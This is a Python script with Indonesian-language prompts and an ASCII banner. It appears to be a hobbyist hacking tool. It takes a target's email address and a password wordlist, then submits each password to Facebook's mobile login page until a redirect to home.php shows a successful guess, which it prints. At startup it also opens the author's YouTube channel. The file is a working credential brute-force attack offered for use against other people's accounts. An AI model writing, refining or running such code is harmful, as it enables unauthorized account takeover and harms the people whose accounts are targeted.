#!/bin/usr/python3
# -*- coding: utf-8: -*utf-8

#modules

import requests
import os.path
import os
from os import path
from termcolor import colored, cprint
from pyfiglet import Figlet
import re


#banner


REAPER = ("""
\033[36;1m╔══╗─╔═══╗╔╗─╔╗╔════╗╔═══╗  ╔═══╗╔═══╗╔═══╗╔═══╗╔══╗─╔═══╗╔═══╗╔╗╔═╗
\033[31;1m║╔╗║─║╔═╗║║║─║║║╔╗╔╗║║╔══╝  ║╔══╝║╔═╗║║╔═╗║║╔══╝║╔╗║─║╔═╗║║╔═╗║║║║╔╝
\033[35;1m║╚╝╚╗║╚═╝║║║─║║╚╝║║╚╝║╚══╗  ║╚══╗║║─║║║║─╚╝║╚══╗║╚╝╚╗║║─║║║║─║║║╚╝╝─
\033[34;1m║╔═╗║║╔╗╔╝║║─║║──║║──║╔══╝  ║╔══╝║╚═╝║║║─╔╗║╔══╝║╔═╗║║║─║║║║─║║║╔╗║─
\033[33;1m║╚═╝║║║║╚╗║╚═╝║──║║──║╚══╗  ║║───║╔═╗║║╚═╝║║╚══╗║╚═╝║║╚═╝║║╚═╝║║║║╚╗
\033[32;1m╚═══╝╚╝╚═╝╚═══╝──╚╝──╚═══╝  ╚╝───╚╝─╚╝╚═══╝╚═══╝╚═══╝╚═══╝╚═══╝╚╝╚═╝
    \033[36;1m==============\033[35;1m[\033[33;1m*\033[35;1m] \033[33;1mSilahkan Login Bro \033[35;1m[\033[33;1m*\033[35;1m]\033[36;1m===================
    \033[36;1m================\033[35;1m=========================\033[36;1m==================
    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mAuthor : Reza Alfauzan                    \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mgithub : Reaper-XD                        \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
    \033[33;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mUntuk Password Dan Usernamenya Kalian     \033[36;1m[\033[33;1m*\033[36;1m]  \033[33;1m===
    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mChat Saya Saja Di fb.com/reza123dcm       \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
    \033[31;1m===  \033[36;1m[\033[33;1m*\033[36;1m] \033[32;1mJangan Recode Entar Error Bang            \033[36;1m[\033[33;1m*\033[36;1m]  \033[31;1m===
    \033[36;1m===========================================================
    \033[33;1m>~>~>~>~>~>~>~>~>~>~>\033[35;1m~~~~~~~~~~~~~~~~\033[33;1m<~<~<~<~<~<~<~<~<~<~<~
    \033[36;1m<\033[35;1m===================\033[33;1m[ \033[31;1mSilahkan Login \033[33;1m]\033[35;1m====================\033[36;1m>""")
#mulai
os.system('xdg-open https://www.youtube.com/channel/UC5zJsltM9leQwjvYqrA_r5Q')
os.system('clear')
print(REAPER)
print('[!]Masukkan Email Target\n')
email = input("Email : ")
print('Masukkan Wordlist(password.txt)')
word = input('Wordlist : ')
exist = os.path.isfile(word)
if exist == False:
        print('\n[!]Masukkan Wordlists Yang Bener!!!!!')
else:
          url = 'https://m.facebook.com/login.php'
          os.system('clear')
          print(REAPER)
          print('\n[!]Mulai Crack : '+ email)
          arq = open(word, 'r').readlines()
          for line in arq:
                password = line.strip()
                http = requests.post(url, data={'email':email, 'pass':password, 'login':'Log In'}, allow_redirects=True)
                content = http.content
                d = http.cookies
                status = http.status_code
                sd = http.url
                if 'home.php'in sd:
                  os.system('clear')
                  print(REAPER)
                  print('[+] Password di Temukan!')
                  print('[+] Password Adalah : '+password)
                  exit()
                else:
                  print('\n(-) Password Gagal Ditemukan : '+password)
